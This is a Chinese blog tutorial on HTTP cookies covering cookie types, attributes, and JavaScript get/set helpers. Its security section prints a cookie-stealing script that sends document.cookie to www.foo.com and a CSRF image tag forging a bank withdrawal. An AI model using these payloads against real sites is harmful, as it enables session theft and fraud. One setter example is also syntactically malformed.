---
layout: post
title: HTTP cookie
category: 理解计算机
tag: HTTP
---


## cookie 的分类

cookie 按照其属性的不同，常见的可以分为以下类别：

### session cookie

session cookie 没有过期时间，当浏览器关闭后就消失了，浏览器将没有设置过期时间的 cookie 作为 session cookie 来处理。

### Persistent cookie

Persistent cookie(意为：持久 cookie),这类 cookie 有一个明确的过期时间，在这段时间里面访问 cookie 归属的网站的时候都会携带 cookie ，通常用 cookie 来存储一些用户的访问信息，比如保存用户的登录状态，用户不必每次访问网站都进行登录。

### Secure cookie

Secure cookie ，这类 cookie 只会在加密传输的情况下携带，比如通过 HTTPs 传输的时候。在通过 HTTP 传输的时候，不会携带设置有 secure 标记的 cookie。

### HttpOnly cookie

当一个 cookie 被设置为 httpOnly 的以后，这个 cookie 不能被 javascript 这样的脚本语言拿到，只能通过 HTTP 和 HTTPs 传输。

### Third-party cookie

cookie 的 domain 属性和浏览器地址栏中 domain 一致的 cookie 叫做 first-party cookie， 第三方 cookie 就是其 domain 属性不同于 浏览器地址栏中的 domain 的，这类 cookie 通常是属于第三方广告商的，他们会记录用户的访问习惯，和浏览历史，以此做到准确投放广告。

对于其中的原理，可以举个例子说明：

当你访问 `a.example.com` 这个网站的时候，这个网站中引用了广告商 `ad.com` 的广告，当广告内容被下载后，广告提供商的脚本会设置一个属于 ad.com 的 cookie 。下次当你访问 `b.example.com` 的时候，这个网站的广告也是 `ad.com` 提供的，此时向 `ad.com` 请求广告内容的时候就会携带上次访问 `a.example.com` 的时候设置的 cookie 。

对于现代浏览器都提供了禁止第三方 cookie 的选项。  

## cookie 的组成

cookie 由一下几个部分组成：

+ name
+ value
+ 其他属性
  + max-age
  + path
  + domain
  + secure

**下面详细就以上属性进行说明**

### name 和 value

cookie 中 name 和 value 不能有 `, ; =` 以及空格 ，因为这几个符号是用来分隔 cookie 中的名和值的。如要包含，则要进行字符转译。在 javascript 中可以使用 `encodeURIComponent` 来完成。

对于服务器要设置 cookie 只需要在 HTTP 响应头部中使用 `Set-Cookie: token=324` 这样的方式就可以了。对于浏览器可以使用以下方法：

```
document.cookie="name=xiaowang";domain="example.com"
```

### max-age

从设置 cookie 起，该 cookie 存在的秒数，如果设置 `max-age=1000` 那么该 cookie 会在 1000 秒后被删除。在早期可能存在 expires 这个属性，这个属性是设置一个具体的过期时间，在 HTTP 1.1 版本中以及被去掉了，但是浏览器还是会认识它，只是当 max-age 和 expires 同时存在的时候，认识 max-age 的浏览器会忽略 expires。关于这一点详细可以看这篇博客：[HTTP Cookies: What's the difference between Max-age and Expires?](http://mrcoles.com/blog/cookies-max-age-vs-expires/)。

### domain 和 path

域名和路径定义了一个 cookie 的可见范围，它告诉浏览器这个 cookie 的归属范围。出于安全原因， domain 只能设置为当前域名的上层域名，比如在 `example.com` 下就不能把 cookie 的 domain 设置为 `a.example.com` ，而 `a.example.com`可以设置 cookie 的 domain 为 `example.com`

对于 path ，如果一个 cookie 的 path 为 `/doc` 那么在 `/doc/` 下面的所有页面都能访问到这个 cookie （前提是 domain 也是满足要求）

另外对于 cookie ，不同的端口是否为跨域，这一点标准中尚未说明。经过测试不同端口是可以拿到互相拿到 cookie 的。

### secure

设置了这个属性后，cookie 就成为一个 `Secure cookie` ，只会在加密传输的时候携带该 cookie。

## cookie 的注意事项

### 跨站脚本 - cookie 盗窃

一个 web 页面中可以包含来自其他站点的 js 脚本，而这些脚本是可以访问到该网站下的 cookie 的，这种情况下这些脚本就可能将 cookie 内容发送出去。比如采用下面方法，将 cookie 发送给 www.foo.com

```javascript
var img = document.createElement('img');
img.src = 'www.foo.com?'+ 'text=' + escape(document.cookie);
```

### 跨站伪造请求

假如，Mallory 在访问 Bob 的博客的时候在他的博客中留言，其中包含如下内容：

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

如果 Bob 访问过银行的网站，且其中的 cookie 还没有过期，那么当 Bob 在访问自己的博客的时候，就会加载这幅图片，就会想 `bank.example.com` 发起请求，这样就形成了一次伪造的请求。

## 使用 javascript 操作 cookie

### 取得 cookie

需要注意的是：在  浏览器中 javascript 是拿不到 cookie 的过期时间，path，domain 等信息的，多条 cookie 之间是通过 `; ` 分号和空格分隔开来的，形如：`"name=xiaoming; age=21" ` 所以想要获取 cookie 首先需要使用 `/;\s/` 这样的正则将其分隔开来，然后对每一项，再使用 `=` 分割这样就得到了键值。最后在对结果进行一些转码。


```javascript
util.getCookie = function(name) {
    var cookie = document.cookie;
    var list = cookie.split(/;\s/);
    for (var i = 0; i < list.length; i++) {
        var pair = list[i].split('=');
        if (pair[0] == name) {
            return decodeURIComponent(pair[1]);
        }
    }
    return null;
};
```

### 设置 cookie

而设置 cookie 的方法则是直接在 document.cookie 上面赋值即可，这不会影响到现有的 cookie （当年我觉得这样会覆盖掉现有的 cookie，其实是并不是这样的），对于 domain 和 path 等信息，可以设置但是不会被访问到。

```javascript
util.setCookie = function(name, value, dayToLive, option) {
    var cookie = name + '=' + encodeURIComponent(value);
    if (typeof dayToLive === 'number') {
        cookie += ';max-age=' + (dayToLive * 24 * 60 * 60);
    }
    if (option) {
        for (var key in option) {
            if (key === 'path') {
                cookie += ';path=' + option[key];
            } else if (key === 'domain') {
                cookie += ';domain=' + option[key];
            } else if (key === 'secure') {
                cookie += ';secure';
            }
        }
    }
    document.cookie = cookie;
};
```
